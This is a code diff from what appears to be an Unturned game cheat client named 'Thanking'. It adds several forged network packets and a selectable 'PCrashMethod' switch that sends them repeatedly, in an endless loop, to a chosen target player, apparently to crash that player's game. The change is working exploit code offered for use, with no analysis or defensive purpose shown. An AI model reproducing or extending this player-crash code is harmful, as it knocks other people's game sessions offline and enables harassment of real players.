@@ -4,7 +4,8 @@ using System.Threading;
 using SDG.Unturned;
 using Steamworks;    
 using Thanking.Attributes;
-using Thanking.Utilities;
+ using Thanking.Options;
+ using Thanking.Utilities;
 using UnityEngine;
 
 namespace Thanking.Threads
@@ -28,12 +29,43 @@ namespace Thanking.Threads
                 .GetField("manager", BindingFlags.NonPublic | BindingFlags.Static).GetValue(null);
             
             instance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
-                instance.channel.getCall("askResources"), out int size, out byte[] Packet, (byte)0, (byte)0);
+                instance.channel.getCall("askResources"), out int S1, out byte[] P1, (byte)0, (byte)0);
+            
+            instance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
+                instance.channel.getCall("askResources"), out int S2, out byte[] P2, byte.MaxValue, byte.MaxValue);
+            
+            StructureManager.instance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
+                StructureManager.instance.channel.getCall("askStructures"), out int S3, out byte[] P3, (byte)0, (byte)0);
+            
+            ZombieManager.instance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
+                ZombieManager.instance.channel.getCall("askZombies"), out int S4, out byte[] P4, (byte)0, (byte)0);
+            
+            ItemManager.instance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
+                ItemManager.instance.channel.getCall("askZombies"), out int S5, out byte[] P5, (byte)0, (byte)0);
             
             while (true)
             {
                 if (PlayerCrashEnabled)
-                    Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, Packet, size, instance.channel.id);
+                {
+                    switch (MiscOptions.PCrashMethod)
+                    {
+                        case 0:
+                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P1, S1, instance.channel.id);
+                            break;
+                        case 1:
+                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P2, S2, instance.channel.id);
+                            break;
+                        case 2:
+                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P3, S3, instance.channel.id);
+                            break;
+                        case 3:
+                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P4, S4, instance.channel.id);
+                            break;
+                        case 4:
+                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P5, S5, instance.channel.id);
+                            break;
+                    }
+                }
                 
                 else
                 {
